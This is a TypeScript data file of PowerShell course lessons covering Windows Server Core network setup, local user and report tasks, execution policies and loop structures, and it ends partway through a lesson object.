import { Lesson } from '../types';

export const LESSONS_PART_2: Lesson[] = [
  // ==========================================================================
  // CHAPTER 9: BUILDING A HEADLESS WINDOWS SERVER CORE FROM SCRATCH
  // ==========================================================================
  {
    id: '9-1',
    chapterId: 'chapter-09',
    slug: 'headless-server-core-build',
    title: 'Step-by-Step Headless Server Core Build: Hostname, Static IP & DNS',
    subtitle: 'Draw the network diagram, configure 192.168.153.210/24 with gateway & DNS at .1, verify every step, and save configureCoreServerBasic.ps1',
    estimatedMinutes: 35,
    diagramId: 'core-network-svg',
    oneSentenceSummary:
      'On a headless Windows Server Core machine with no GUI, four PowerShell commands (`Update-Help`, `Rename-Computer`, `New-NetIPAddress`, `Set-DnsClientServerAddress`) transform a bare VM into a production-ready network server.',
    summary:
      'When you boot a fresh Windows Server Core machine for the first time, there is no Start Menu, no taskbar, and no Control Panel, just a lonely terminal window. In this lesson, I walk you through my exact production sequence for bringing up a bare Server Core VM (`192.168.153.210/24` behind a `192.168.153.1` gateway/DNS appliance), verifying every step, and saving the entire build as a reusable script (`configureCoreServerBasic.ps1`).',
    whyItMatters:
      'In real datacenters, Microsoft recommends **Windows Server Core** as the default installation option because eliminating the Desktop Experience GUI cuts the patching footprint, saves gigabytes of RAM, and drastically shrinks the attack surface.',
    learningObjectives: [
      'Launch PowerShell from a fresh Server Core console (`sconfig` Option 15 or typing `powershell` in `cmd.exe`) and run `Update-Help -Force`',
      'Inspect the current hostname (`$env:COMPUTERNAME`), rename the server with `Rename-Computer -NewName`, and know why a reboot is required to finalize it',
      'Discover the active network adapter’s `ifIndex` using `Get-NetAdapter`',
      'Assign a static IPv4 address, subnet prefix (`/24`), and Default Gateway using `New-NetIPAddress` and configure DNS servers using `Set-DnsClientServerAddress`',
    ],
    keyTerms: [
      'Windows Server Core (Headless OS)',
      'Rename-Computer',
      'Get-NetAdapter & ifIndex (InterfaceIndex)',
      'New-NetIPAddress & PrefixLength (/24)',
      'Set-DnsClientServerAddress',
      'configureCoreServerBasic.ps1',
    ],
    conceptSections: [
      {
        heading: 'Step 1 & 2: Entering PowerShell on Server Core, Updating Help & Renaming the Host',
        body: [
          'When you first log into a fresh Windows Server Core installation, you land either in `cmd.exe` or the text menu `sconfig`. If you are in `sconfig`, select **Option 15** to exit to the command line; if you are in `cmd.exe`, type **`powershell`** to launch PowerShell.',
          'Before touching the network (while your VM still has temporary NAT/DHCP internet access), download the offline help library so you are never flying blind:\n`Update-Help -Force`',
          'Next, replace the random factory hostname (like `WIN-8K49A2L`) with a clean, meaningful server name:\n• Check the current name: **`$env:COMPUTERNAME`** (or `hostname`)\n• Rename the computer: **`Rename-Computer -NewName "SRV-CORE01"`**\n• **Important:** Renaming a Windows host does not take full effect until the machine restarts (`Restart-Computer`). You can either pass `-Restart` immediately or reboot at the end of your script after configuring the IP and DNS!',
        ],
      },
      {
        heading: 'Step 3 & 4: Discovering the Adapter Index (ifIndex) and Assigning a Static IP & DNS',
        body: [
          'A server can never rely on a changing DHCP address, clients and firewalls expect a fixed **Static IP**. Look at our network topology diagram below:\n• **Server Core IP:** `192.168.153.210`\n• **Subnet Mask:** `255.255.255.0` → which is **`PrefixLength 24`** (24 network bits: `8 + 8 + 8 = 24`)\n• **Default Gateway & DNS (`pfSense`):** `192.168.153.1`',
          'How do we tell PowerShell *which* network card to configure? Run **`Get-NetAdapter`** and look at the **`ifIndex`** column (for example, `ifIndex 4` or `12`). Then run two commands:\n1. **Assign the Static IPv4, Subnet Prefix, and Gateway:**\n   `New-NetIPAddress -InterfaceIndex 4 -IPAddress 192.168.153.210 -PrefixLength 24 -DefaultGateway 192.168.153.1`\n2. **Point the DNS Client at the DNS Server:**\n   `Set-DnsClientServerAddress -InterfaceIndex 4 -ServerAddresses 192.168.153.1`',
        ],
      },
      {
        heading: 'Step 5: Verifying Everything & Saving configureCoreServerBasic.ps1',
        body: [
          'Never assume a network change worked, always verify with the matching `Get-*` cmdlets:\n• **`Get-NetIPAddress -InterfaceIndex 4 -AddressFamily IPv4`** (Check `IPAddress` and `PrefixLength`)\n• **`Get-NetIPConfiguration -InterfaceIndex 4`** (Shows IP, Default Gateway, and DNS together!)\n• **`Get-DnsClientServerAddress -InterfaceIndex 4 -AddressFamily IPv4`** (Check `ServerAddresses`)\n• **`Test-Connection 192.168.153.1 -Count 2`** (Verify layer-3 reachability to the gateway)',
          'Finally, in keeping with the **DRY principle**, we save all these commands into **`configureCoreServerBasic.ps1`** so the next 50 Server Core machines can be provisioned in 2 seconds!',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Find your NIC’s `ifIndex` with `Get-NetAdapter`, set the IP and gateway with `New-NetIPAddress`, set DNS with `Set-DnsClientServerAddress`, and set the hostname with `Rename-Computer`.',
      },
      {
        type: 'gotcha',
        title: 'Why Subnet Mask 255.255.255.0 Is Written as -PrefixLength 24',
        body: '`New-NetIPAddress` does not take dotted subnet masks like `255.255.255.0`. It uses CIDR prefix notation: `/8` = `255.0.0.0`, `/16` = `255.255.0.0`, and **`/24` = `255.255.255.0`**.',
      },
      {
        type: 'pro',
        title: 'Modifying an Existing IP vs. Creating a New IP',
        body: 'If an interface already has a static IP and you want to change its subnet mask, use `Set-NetIPAddress`. If you are replacing an old static IP completely, run `Remove-NetIPAddress` first and then `New-NetIPAddress`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-NetIPAddress',
        aliases: [],
        syntax: 'New-NetIPAddress -InterfaceIndex <UInt32> -IPAddress <String> -PrefixLength <Byte> [-DefaultGateway <String>]',
        parameters: [
          {
            name: '-InterfaceIndex',
            type: 'UInt32',
            description: 'The numeric ifIndex of the network adapter from Get-NetAdapter.',
          },
          {
            name: '-IPAddress',
            type: 'String',
            description: 'The static IPv4 or IPv6 address to assign (e.g., 192.168.153.210).',
          },
          {
            name: '-PrefixLength',
            type: 'Byte',
            description: 'The subnet mask bit length (e.g., 24 for 255.255.255.0).',
          },
          {
            name: '-DefaultGateway',
            type: 'String',
            description: 'The IP address of the router/gateway on the same subnet (e.g., 192.168.153.1).',
          },
        ],
        examples: [
          'New-NetIPAddress -InterfaceIndex 4 -IPAddress "192.168.153.210" -PrefixLength 24 -DefaultGateway "192.168.153.1"',
        ],
      },
      {
        cmdlet: 'Set-DnsClientServerAddress',
        aliases: [],
        syntax: 'Set-DnsClientServerAddress -InterfaceIndex <UInt32> -ServerAddresses <String[]>',
        parameters: [
          {
            name: '-InterfaceIndex',
            type: 'UInt32',
            description: 'The numeric ifIndex of the network adapter.',
          },
          {
            name: '-ServerAddresses',
            type: 'String[]',
            description: 'One or more DNS server IP addresses (e.g., "192.168.153.1", "1.1.1.1").',
          },
        ],
        examples: [
          'Set-DnsClientServerAddress -InterfaceIndex 4 -ServerAddresses "192.168.153.1"',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Complete configureCoreServerBasic.ps1 Production Script',
        description: 'The complete, self-documented provisioning script for a headless Windows Server Core host.',
        code: `# =====================================================================
# Script: configureCoreServerBasic.ps1
# Author: Muhammad Izaz Haider
# Purpose: Initial headless configuration of Windows Server Core
# =====================================================================

# 1. Discover the active Ethernet adapter's InterfaceIndex (ifIndex)
$adapter = Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1
$ifIndex = $adapter.ifIndex
Write-Output "Configuring Adapter: $($adapter.Name) (ifIndex: $ifIndex)"

# 2. Assign Static IPv4 Address (192.168.153.210/24) and Default Gateway (192.168.153.1)
New-NetIPAddress -InterfaceIndex $ifIndex \`
  -IPAddress '192.168.153.210' \`
  -PrefixLength 24 \`
  -DefaultGateway '192.168.153.1'

# 3. Configure the DNS Client Server Address
Set-DnsClientServerAddress -InterfaceIndex $ifIndex \`
  -ServerAddresses '192.168.153.1'

# 4. Verify IP and DNS Settings
Get-NetIPAddress -InterfaceIndex $ifIndex -AddressFamily IPv4 |
  Select-Object InterfaceAlias, IPAddress, PrefixLength
Get-DnsClientServerAddress -InterfaceIndex $ifIndex -AddressFamily IPv4 |
  Select-Object InterfaceAlias, ServerAddresses

# 5. Rename the Server Core Host and Reboot to apply
Rename-Computer -NewName 'SRV-CORE01' -Restart`,
        output: `Configuring Adapter: Ethernet0 (ifIndex: 4)

InterfaceAlias IPAddress       PrefixLength
-------------- ---------       ------------
Ethernet0      192.168.153.210           24

InterfaceAlias ServerAddresses
-------------- ---------------
Ethernet0      {192.168.153.1}`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Guessing `-InterfaceIndex 1` without running `Get-NetAdapter` first.',
        cause: 'InterfaceIndex 1 is often the loopback pseudo-interface or a disconnected virtual adapter.',
        fix: 'Always run `Get-NetAdapter` first to read the exact `ifIndex` of your active (`Up`) Ethernet adapter.',
      },
    ],
    tryItYourself: [
      'Run `Get-NetAdapter` on your machine right now and identify the `ifIndex` and `MacAddress` of your primary network interface.',
      'Run `Get-NetIPAddress -AddressFamily IPv4` and `Get-DnsClientServerAddress -AddressFamily IPv4` to inspect your current IP, PrefixLength, and DNS servers.',
    ],
    knowledgeCheck: [
      {
        question: 'Which cmdlet assigns a new static IPv4 address, subnet prefix length (/24), and default gateway to a network adapter?',
        options: [
          'Set-DnsClientServerAddress',
          'New-NetIPAddress',
          'Get-NetAdapter',
          'Rename-Computer',
        ],
        correctIndex: 1,
        explanation: 'New-NetIPAddress takes -InterfaceIndex, -IPAddress, -PrefixLength, and -DefaultGateway to configure static IPv4 addressing.',
      },
      {
        question: 'In New-NetIPAddress, what value do you pass to -PrefixLength to represent the subnet mask 255.255.255.0?',
        options: ['8', '16', '24', '32'],
        correctIndex: 2,
        explanation: '255.255.255.0 has three full octets of 1s (8 + 8 + 8 = 24 bits), which is /24 (PrefixLength 24).',
      },
    ],
  },

  {
    id: '9-2',
    chapterId: 'chapter-09',
    slug: 'hands-on-admin-workout',
    title: 'The Complete Hands-On Admin Workout: Local Users, Processes, Disks & Dates',
    subtitle: 'Practice every real-world task: local user creation from custom objects, disk inspection, date formatting, and HTML exports',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Put your core skills together by provisioning local user accounts via `[PSCustomObject]` pipeline binding, formatting dates without hitting the `mm` vs `MM` trap, inspecting disks, and exporting service reports to TXT, CSV, and HTML.',
    summary:
      'Now that our Server Core machine is online, let’s run through a complete, real-world administrative workout. You will create local user accounts (`New-LocalUser`) both directly and by piping a `[PSCustomObject]` `ByPropertyName`, inspect disk volumes, solve the classic `Get-Date -Format "dd-MM-yyyy"` capital-`MM` month vs. lowercase-`mm` minutes trap, and generate multi-format system reports.',
    whyItMatters:
      'These exact tasks, creating local admin/service accounts, calculating process runtimes, formatting timestamps for log filenames, and exporting audit reports, are the building blocks of every enterprise script you will ever write.',
    learningObjectives: [
      'List, create, and remove local user accounts using `Get-LocalUser`, `New-LocalUser`, and `Remove-LocalUser`',
      'Pipe a `[PSCustomObject]@{ Name=...; Description=...; Password=... }` directly into `New-LocalUser` via `ByPropertyName` binding',
      'Format dates accurately with `Get-Date -Format "dd-MM-yyyy"` (knowing why `MM` is Month and `mm` is Minute!)',
      'Export filtered service and process reports to plain text (`Out-File`), CSV (`Export-Csv`), and HTML (`ConvertTo-Html | Out-File`)',
    ],
    keyTerms: [
      'New-LocalUser / Get-LocalUser / Remove-LocalUser',
      'ByPropertyName Object Provisioning',
      'Get-Date -Format "dd-MM-yyyy" (MM vs mm)',
      'Get-Volume & Get-Disk',
      'Export-Csv -NoTypeInformation',
      'ConvertTo-Html | Out-File',
    ],
    conceptSections: [
      {
        heading: 'Provisioning Local Users: Direct Parameters vs. Piping a [PSCustomObject]',
        body: [
          'The `Microsoft.PowerShell.LocalAccounts` module gives you full control over local accounts on any workstation or Server Core machine:\n• List all local accounts: **`Get-LocalUser`**\n• Create an account with no password: **`New-LocalUser -Name "LabGuest" -NoPassword`**\n• Create an account with an encrypted password:\n  `$pwd = Read-Host "Enter password" -AsSecureString`\n  `New-LocalUser -Name "Operator01" -Password $pwd -FullName "Ops Account" -Description "Server Operator"`\n• Delete the account: **`Remove-LocalUser -Name "Operator01"`**',
          '**The Pro Move (Piping a `[PSCustomObject]` into `New-LocalUser`):** Because `New-LocalUser` accepts `-Name`, `-Description`, and `-Password` **`ByPropertyName`**, you can package a user’s attributes inside a `[PSCustomObject]` and pipe it straight into `New-LocalUser`:\n`$newUser = [PSCustomObject]@{ Name = "AuditAdmin"; Description = "Security Auditor"; Password = $pwd }`\n`$newUser | New-LocalUser`',
        ],
      },
      {
        heading: 'The Famous Get-Date Formatting Trap: Capital MM (Month) vs. Lowercase mm (Minute)!',
        body: [
          'When you name log files or print report timestamps, you will use **`Get-Date -Format "..."`**. Memorize this `.NET` date formatting rule right now, because getting it wrong puts the current **minute of the hour** where the **month** belongs:\n• **`dd`:** Two-digit Day (`03`)\n• **`MM` (UPPERCASE!):** Two-digit **Month** (`11` for November) - or `MMMM` for full month name (`November`)\n• **`mm` (lowercase!):** Two-digit **Minute** (`00` - `59`)\n• **`yyyy`:** Four-digit Year (`2026`)\n• **`HH` vs `hh`:** `HH` is 24-hour clock (`00` - `23`); `hh` is 12-hour clock (`01` - `12`).',
          'So if you want `03-11-2026`, the command is:\n**`Get-Date -Format "dd-MM-yyyy"`** *(never `"dd-mm-yyyy"`!)*',
        ],
      },
      {
        heading: 'Exporting System Reports: Out-File vs. Export-Csv vs. ConvertTo-Html',
        body: [
          'How do you save your pipeline output to disk so a manager or auditor can read it?\n1. **Plain Text (`Out-File`):** Saves screen-style text to a `.txt` file:\n   `Get-Service | Where-Object Status -eq "Running" | Out-File -FilePath C:\\Reports\\running.txt`\n2. **Structured Spreadsheet (`Export-Csv`):** Saves every object property as a clean CSV column ready for Excel:\n   `Get-Service | Select-Object Name, DisplayName, Status | Export-Csv -Path C:\\Reports\\services.csv -NoTypeInformation`\n3. **Web Report (`ConvertTo-Html | Out-File`):** Notice the verb is **`ConvertTo`**, not `Export`! `ConvertTo-Html` converts objects into HTML strings in memory, which you then pipe to **`Out-File`** to save as an `.html` file:\n   `Get-Service | Select-Object Name, DisplayName, Status | ConvertTo-Html -Title "Service Audit" | Out-File C:\\Reports\\services.html`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'In `Get-Date -Format`, uppercase `MM` is Month while lowercase `mm` is Minute; and `ConvertTo-Html` transforms objects in memory so you must pipe it to `Out-File` to save a file.',
      },
      {
        type: 'gotcha',
        title: 'Export-Csv vs. ConvertTo-Html',
        body: '`Export-Csv` writes directly to a file on disk (`-Path`). `ConvertTo-Html` and `ConvertTo-Json` only convert the objects into strings in the pipeline, you still need `| Out-File report.html` to write them to disk!',
      },
      {
        type: 'try',
        title: 'Test the MM vs. mm Trap Live',
        body: 'Run `Get-Date -Format "dd-MM-yyyy HH:mm:ss"` right now and compare the `MM` (month) value with the `mm` (minutes) value.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-LocalUser',
        aliases: [],
        syntax: 'New-LocalUser [-Name] <String> [-Password <SecureString>] [-Description <String>] [-NoPassword]',
        parameters: [
          {
            name: '-Name',
            type: 'String',
            description: 'Specifies the username for the new local user account (accepts pipeline input ByPropertyName).',
          },
          {
            name: '-Password',
            type: 'SecureString',
            description: 'Specifies the password as a SecureString object (accepts pipeline input ByPropertyName).',
          },
        ],
        examples: [
          '$pwd = Read-Host "Password" -AsSecureString ; New-LocalUser -Name "LabAdmin" -Password $pwd',
        ],
      },
      {
        cmdlet: 'Get-Date',
        aliases: [],
        syntax: 'Get-Date [-Format <String>]',
        parameters: [
          {
            name: '-Format',
            type: 'String',
            description: 'Formats the date using .NET format specifiers (dd = day, MM = month, yyyy = year, HH = 24h hour, mm = minute).',
          },
        ],
        examples: ['Get-Date -Format "dd-MM-yyyy"', 'Get-Date -Format "yyyy-MM-dd_HH-mm"'],
      },
    ],
    codeExamples: [
      {
        title: 'Local User Provisioning via [PSCustomObject], Date Formatting, and HTML Reporting',
        description: 'Create a local user from a custom object, format dates accurately, and export an HTML report of running services.',
        code: `# 1. Format current date as dd-MM-yyyy (Capital MM = Month!)
$today = Get-Date -Format 'dd-MM-yyyy'
Write-Output "Report Date: $today"

# 2. Provision a Local User by piping a [PSCustomObject] (Binds ByPropertyName!)
$secPwd = ConvertTo-SecureString 'P@ssw0rd2026!Lab' -AsPlainText -Force
$userSpec = [PSCustomObject]@{
  Name        = 'TempLabUser'
  Description = "Created on $today"
  Password    = $secPwd
}
# $userSpec | New-LocalUser
# Remove-LocalUser -Name 'TempLabUser'

# 3. Export Running Services to an HTML file
$htmlPath = Join-Path $env:TEMP 'RunningServices.html'
Get-Service |
  Where-Object Status -eq 'Running' |
  Select-Object Name, DisplayName, Status |
  ConvertTo-Html -Title "Running Services ($today)" |
  Out-File -FilePath $htmlPath

Write-Output "Saved HTML report to: $htmlPath"`,
        output: `Report Date: 03-11-2026
Saved HTML report to: C:\\Users\\izaz\\AppData\\Local\\Temp\\RunningServices.html`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Writing `Get-Date -Format "dd-mm-yyyy"` with a lowercase `mm`.',
        cause: 'In `.NET` date formatting, lowercase `m` stands for **minute**, whereas uppercase `M` stands for **Month**.',
        fix: 'Always use uppercase `MM` for months: `Get-Date -Format "dd-MM-yyyy"`.',
      },
    ],
    tryItYourself: [
      'Run `Get-Date -Format "dd-MM-yyyy"` and `Get-Date -Format "yyyy-MM-dd HH:mm:ss"`.',
      'Run `Get-Volume` to inspect all drive letters, file systems (`NTFS`), health statuses, and remaining free space on your machine.',
    ],
    knowledgeCheck: [
      {
        question: 'Which command outputs the current date in Day-Month-Year format (e.g., 03-11-2026)?',
        options: [
          'Get-Date -Format "dd-mm-yyyy"',
          'Get-Date -Format "dd-MM-yyyy"',
          'Get-Date -Display "Day-Month-Year"',
          'Format-Date -Day -Month -Year',
        ],
        correctIndex: 1,
        explanation: 'Uppercase MM represents the two-digit Month (01 to 12), whereas lowercase mm represents minutes (00 to 59).',
      },
      {
        question: 'Why must you pipe `ConvertTo-Html` into `Out-File` to create an .html file on disk?',
        options: [
          'ConvertTo-Html only converts objects into HTML text lines in memory; Out-File writes those lines to a file on disk',
          'ConvertTo-Html is an alias for Get-Process',
          'Out-File compiles C# code',
          'HTML files can only be saved in C:\\Windows',
        ],
        correctIndex: 0,
        explanation: 'ConvertTo-* cmdlets convert objects in memory and emit strings to the pipeline; Out-File (or Set-Content) writes those strings to disk.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 10: SCRIPTS, EXECUTION POLICIES & CONTROL FLOW LOGIC
  // ==========================================================================
  {
    id: '10-1',
    chapterId: 'chapter-10',
    slug: 'scripts-and-execution-policies',
    title: 'Writing .ps1 Scripts, The .\\ Security Rule & Execution Policies',
    subtitle: 'Build 5 practical admin scripts from scratch and understand why Execution Policy is a seatbelt, not a firewall',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'PowerShell scripts are plain-text `.ps1` files that you launch with explicit relative pathing (`.\\script.ps1`) after setting `Set-ExecutionPolicy RemoteSigned` - a safety seatbelt that prevents accidental execution.',
    summary:
      'Any sequence of commands you can run at the prompt can be saved into a `.ps1` file and run a thousand times. But the first time you try to run `myscript.ps1`, PowerShell blocks you for two reasons: you didn’t type `.\\myscript.ps1`, and your Execution Policy is set to `Restricted`! In this lesson, we learn both security mechanisms and write reusable `.ps1` scripts.',
    whyItMatters:
      'Understanding why PowerShell requires `.\\` (to stop current-directory command hijacking) and what each of the 4 major Execution Policies (`Restricted`, `AllSigned`, `RemoteSigned`, `Unrestricted`) actually enforces is essential for every sysadmin and security engineer.',
    learningObjectives: [
      'Write, comment (`#` and `<# ... #>`), and save `.ps1` scripts',
      'Explain why PowerShell requires `.\\script.ps1` instead of `script.ps1` to prevent path-hijacking attacks',
      'Compare the 4 core Execution Policies: `Restricted`, `AllSigned`, `RemoteSigned` (recommended), and `Unrestricted`',
      'Inspect and configure execution policies using `Get-ExecutionPolicy` and `Set-ExecutionPolicy RemoteSigned`',
    ],
    keyTerms: [
      '.ps1 Script File',
      '.\\ Relative Path Execution Rule',
      'Execution Policy (Seatbelt vs Boundary)',
      'Restricted vs. RemoteSigned vs. AllSigned vs. Unrestricted',
      'Get-ExecutionPolicy & Set-ExecutionPolicy',
      'Mark of the Web (Zone.Identifier)',
    ],
    conceptSections: [
      {
        heading: 'Why You Must Type .\\myscript.ps1 (Stopping Command Hijacking)',
        body: [
          'In old MS-DOS, if you were sitting inside `C:\\Temp` and typed `ping`, DOS checked `C:\\Temp` *first* before looking in `C:\\Windows\\System32`. If a malicious user dropped a fake `ping.bat` inside `C:\\Temp`, you accidentally ran their malware!',
          'PowerShell fixes this permanently: **PowerShell never runs scripts from the current working directory unless you explicitly prefix the filename with `.\\` (dot-backslash):**\n`Set-Location C:\\Scripts`\n`.\\myscript.ps1`\nThat `.\\` tells PowerShell: *"Yes, I intentionally want to run the file sitting right here in my current folder."* Always document your scripts using `#` for single-line comments or `<# ... #>` for multi-line comment blocks.',
        ],
      },
      {
        heading: 'The 4 Execution Policies: Why I Recommend RemoteSigned',
        body: [
          'To stop users from accidentally double-clicking random `.ps1` scripts, PowerShell enforces an **Execution Policy**:\n1. **`Restricted` (Default on Windows Client):** Blocks **all** `.ps1` scripts from running (interactive commands only).\n2. **`AllSigned`:** Every script, even one you just wrote yourself on your own machine, must be digitally signed by a trusted code-signing certificate.\n3. **`RemoteSigned` (Default on Windows Server & My Recommended Setting):** Scripts you write **locally** on your own machine run freely without needing a signature, **but** any script downloaded from the internet (which carries the NTFS "Mark of the Web" stream) is blocked unless digitally signed!\n4. **`Unrestricted` / `Bypass`:** Runs all scripts (warns on downloaded scripts in `Unrestricted`; no warnings at all in `Bypass`).',
          'To check and update your policy (in an Administrator shell):\n`Get-ExecutionPolicy`\n`Set-ExecutionPolicy RemoteSigned`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Use `Set-ExecutionPolicy RemoteSigned` so your own local `.ps1` scripts run cleanly via `.\\script.ps1` while untrusted internet downloads stay blocked.',
      },
      {
        type: 'danger',
        title: 'Security Lens: Execution Policy Is a Seatbelt, NOT a Security Boundary!',
        body: 'Never rely on `Restricted` or `AllSigned` to stop a real attacker who already has terminal access! Why? Because anyone can run `powershell.exe -ExecutionPolicy Bypass -File script.ps1` or pipe code into `Invoke-Expression`. Execution Policy protects legitimate admins from *accidents*; to block attackers, we use AppLocker/WDAC and Constrained Language Mode (Chapter 16)!',
      },
      {
        type: 'pro',
        title: 'Unblocking a Safe Script Downloaded from GitHub',
        body: 'If you are running `RemoteSigned` and download a legitimate `.ps1` script from your team’s GitHub repo, inspect the code first and then run `Unblock-File -Path .\\script.ps1` to remove its Mark of the Web.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Set-ExecutionPolicy',
        aliases: [],
        syntax: 'Set-ExecutionPolicy [-ExecutionPolicy] <ExecutionPolicy> [-Scope <ExecutionPolicyScope>] [-Force]',
        parameters: [
          {
            name: '-ExecutionPolicy',
            type: 'ExecutionPolicy',
            description: 'Specifies the policy level: Restricted, AllSigned, RemoteSigned, Unrestricted, or Bypass.',
          },
          {
            name: '-Scope',
            type: 'ExecutionPolicyScope',
            description: 'Targets LocalMachine (default, requires Admin), CurrentUser, or Process (current window only).',
          },
        ],
        examples: [
          'Set-ExecutionPolicy RemoteSigned',
          'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Checking Execution Policies and Writing Interactive Admin Scripts',
        description: 'Inspect execution policies across all scopes and write a clean, parameterized service-filtering script.',
        code: `# 1. View Execution Policies across all scopes (MachinePolicy, UserPolicy, Process, CurrentUser, LocalMachine)
Get-ExecutionPolicy -List

# 2. Set RemoteSigned for the current user (no Admin prompt required)
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# 3. Example contents of Get-ServicesByStatus.ps1
<#
  .SYNOPSIS
  Prompts for a service status (Running or Stopped) and exports a filtered report.
#>
$targetStatus = Read-Host -Prompt "Enter status to filter (Running or Stopped)"
Get-Service |
  Where-Object Status -eq $targetStatus |
  Select-Object -First 5 Name, DisplayName, Status`,
        output: `        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser    RemoteSigned
 LocalMachine    RemoteSigned

Enter status to filter (Running or Stopped): Running

Name     DisplayName                             Status
----     -----------                             ------
Appinfo  Application Information                 Running
AudioSrv Windows Audio                           Running
BFE      Base Filtering Engine                   Running
BITS     Background Intelligent Transfer Service Running
Dnscache DNS Client                              Running`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Typing `myscript.ps1` while inside `C:\\Scripts` and wondering why PowerShell says "The term is not recognized".',
        cause: 'PowerShell does not search the current directory unless you prefix the script with `.\\`.',
        fix: 'Run `.\\myscript.ps1`.',
      },
    ],
    tryItYourself: [
      'Run `Get-ExecutionPolicy -List` to see which Execution Policy is currently active on your machine.',
      'Save a 2-line script to `$env:TEMP\\hello.ps1` and run it using `& "$env:TEMP\\hello.ps1"`.',
    ],
    knowledgeCheck: [
      {
        question: 'Which Execution Policy allows you to run local .ps1 scripts that you wrote yourself while requiring a digital signature on scripts downloaded from the internet?',
        options: ['Restricted', 'AllSigned', 'RemoteSigned', 'Bypass'],
        correctIndex: 2,
        explanation: 'RemoteSigned allows locally created scripts to run unsigned while requiring a trusted digital signature on scripts downloaded from external zones.',
      },
      {
        question: 'Why does PowerShell require you to type `.\\deploy.ps1` instead of `deploy.ps1` when running a script in your current directory?',
        options: [
          'Because Windows does not support filenames without slashes',
          'To prevent command-hijacking attacks where a malicious script in the current folder masquerades as a system command',
          'To encrypt the script',
          'Because .\\ runs the script in Kernel Mode',
        ],
        correctIndex: 1,
        explanation: 'Requiring .\\ ensures you never accidentally execute a trojan script sitting in your working directory when typing a normal command name.',
      },
    ],
  },

  {
    id: '10-2',
    chapterId: 'chapter-10',
    slug: 'control-flow-and-loops',
    title: 'Control Structures: Sequence, Selection (If/Else) & Loops (For, While, Foreach)',
    subtitle: 'Master array and object loops, subexpression expansion $($proc.Id), and index replacement',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Every script in computer science is built from just three control structures: Sequence (top-to-bottom), Selection (`if / elseif / else`), and Iteration (`foreach ($item in $collection)`, `for`, and `while`).',
    summary:
      'When your scripts need to make decisions ("If the server responds to ping, deploy the update; otherwise log an alert") or repeat an action across 50 items, you use Control Structures. In this lesson, we master `if / elseif / else` (including boolean shortcuts like `Test-Connection -Quiet`), compare `for`, `while`, and `foreach ($item in $collection)` loops, and see when to use a `for ($i = 0; ...)` index loop vs. a `foreach` object loop.',
    whyItMatters:
      'Knowing when to use `foreach ($proc in $processes)` (for reading objects cleanly) versus `for ($i = 0; $i -lt $arr.Count; $i++)` (when you need to overwrite elements inside the original array by index `$arr[$i]`) prevents subtle logic bugs.',
    learningObjectives: [
      'Write conditional decision branches using `if (...) { } elseif (...) { } else { }`',
      'Use cmdlets that return `$true`/`$false` (like `Test-Path` and `Test-Connection -Quiet`) directly inside `if (...)` conditions',
      'Write `for ($i = 0; $i -lt $arr.Count; $i++)` loops using `-lt` (never `-le`!) to avoid off-by-one errors',
      'Iterate over live object collections cleanly with `foreach ($item in $collection)` and expand properties with `$($item.Property)`',
    ],
    keyTerms: [
      'Sequence, Selection, Iteration',
      'if / elseif / else',
      'Test-Connection -Quiet & Test-Path',
      'for ($i = 0; $i -lt $arr.Count; $i++)',
      'while ($condition) { }',
      'foreach ($item in $collection) { }',
    ],
    conceptSections: [
      {
        heading: 'Selection: Making Decisions with if / elseif / else and -Quiet',
        body: [
          'A **Selection** structure evaluates a condition in parentheses `( ... )` and runs the matching `{ ... }` block:\n```powershell\nif ($freeGB -lt 10) {\n    Write-Output "CRITICAL: Low Disk Space!"\n} elseif ($freeGB -lt 25) {\n    Write-Output "WARNING: Disk Space below 25 GB"\n} else {\n    Write-Output "HEALTHY: Plenty of disk space"\n}\n```',
          '**Pro Tip (`Test-Connection -Quiet` and `Test-Path`):** Many PowerShell cmdlets have a `-Quiet` switch (or return a boolean by default) so they output a clean `$true` or `$false`. That means you can place them right inside `if (...)`:\n`if (Test-Connection -ComputerName 192.168.153.1 -Count 1 -Quiet) { Write-Output "Gateway is ONLINE" }`',
        ],
      },
      {
        heading: 'Iteration: Choosing Between foreach, for, and while',
        body: [
          'PowerShell gives you three main loops to repeat actions:\n1. **`foreach ($item in $collection)` (My #1 Choice for Object Collections):**\n   Steps through every item in an array or cmdlet output automatically, no counters or index math needed!\n   ```powershell\n   $procs = Get-Process | Select-Object -First 3\n   foreach ($p in $procs) {\n       Write-Output "$($p.Name) has PID $($p.Id)"\n   }\n   ```\n2. **`for ($i = 0; $i -lt $arr.Count; $i++)` (Use When You Need the Index `$i`):**\n   Starts counter `$i` at `0`, loops while `$i -lt $arr.Count` (**always `-lt`, never `-le`**, because a 4-item array has indices `0, 1, 2, 3`!), and increments `$i++`. Use `for` when you want to **modify an element in place** inside the array (`$arr[$i] = "NewValue"`).\n3. **`while ($condition)` (Use When Waiting for a State Change):**\n   Keeps looping as long as the condition is `$true` (e.g., waiting for a service or rebooting server to come back online).',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Use `if / elseif / else` for decisions, `foreach ($item in $list)` to iterate over objects cleanly, and `for ($i = 0; $i -lt $list.Count; $i++)` when you need to modify array elements by index `$list[$i]`.',
      },
      {
        type: 'gotcha',
        title: 'The Classic Off-By-One Bug: Always Use -lt $arr.Count, Never -le!',
